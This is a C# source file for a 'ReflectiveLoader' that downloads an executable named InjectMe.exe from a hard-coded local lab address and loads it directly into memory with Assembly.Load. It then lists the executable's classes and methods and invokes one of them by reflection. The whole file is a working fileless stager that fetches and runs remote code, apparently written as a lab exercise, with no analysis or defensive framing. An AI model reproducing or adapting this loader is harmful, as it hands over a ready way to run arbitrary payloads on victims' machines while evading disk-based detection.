using System;
using System.IO;
using System.Reflection;
using System.Net;
using System.Threading;

namespace ReflectiveLoader
{
    class Program
    {
        public static Assembly reflectionFromPath(String path)
        {

            Byte[] rawAssemblyBytes = File.ReadAllBytes(path);
            Assembly bin = Assembly.Load(rawAssemblyBytes);
            return bin;

        }

        public static Assembly reflectionFromURL(String url)
        {
            Byte[] rawAssemblyBytes = { };
            Assembly bin = null;
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls;
            WebClient client = new WebClient();
            try
                {
                    //will throw a HttpStatusCode.NotFound if file is not there.
                    rawAssemblyBytes = client.DownloadData(url);
                    Console.WriteLine("assembly found! loading now...");
                    Console.WriteLine("size of assembly: " + rawAssemblyBytes.Length);
                    bin = Assembly.Load(rawAssemblyBytes);
                    return bin;
                }
                catch(Exception)
                {
                    throw new WebException("Assembly not found. Aborting...");
                }
        }


        public static Type[] getTypes(Assembly assembly)
        {

            Type[] assemblyTypes = assembly.GetTypes();
            Console.WriteLine("The following classes are available in {0}: ", assembly.GetName());
            foreach (Type classType in assemblyTypes)
            {
                Console.WriteLine(classType.Name);
            }
            Console.WriteLine("==============================");
            return assemblyTypes;
        }

        public static MethodInfo[] getMethodsForType(Type classType)
        {
            MethodInfo[] methods = classType.GetMethods();
            Console.WriteLine("The available methods for {0} are: ", classType.Name);
            foreach (MethodInfo method in methods)
            {

                Console.WriteLine(method.Name);
                //Console.WriteLine(method.Attributes);
            }
            Console.WriteLine("==============================");
            return methods;
        }



        //public static void 
        static void Main(string[] args)
        {
            try
            {
                Assembly loadedAssembly = reflectionFromURL(@"http://192.168.56.1:8080/InjectMe.exe");
                Type program = getTypes(loadedAssembly)[0];
                getMethodsForType(program);
                MethodInfo mainMethod = program.GetMethod("success");
                object initalizedProgram = Activator.CreateInstance(program);
                Console.WriteLine("Calling the {0} method from the  {1} class of the {2} assembly, let's see what happens... ", mainMethod.Name, program.Name, loadedAssembly.GetName());
                mainMethod.Invoke(initalizedProgram, null);
            }
            catch (Exception e)
            {
                Console.WriteLine(e.Message);
            }
            Console.ReadKey();

        }
    }
}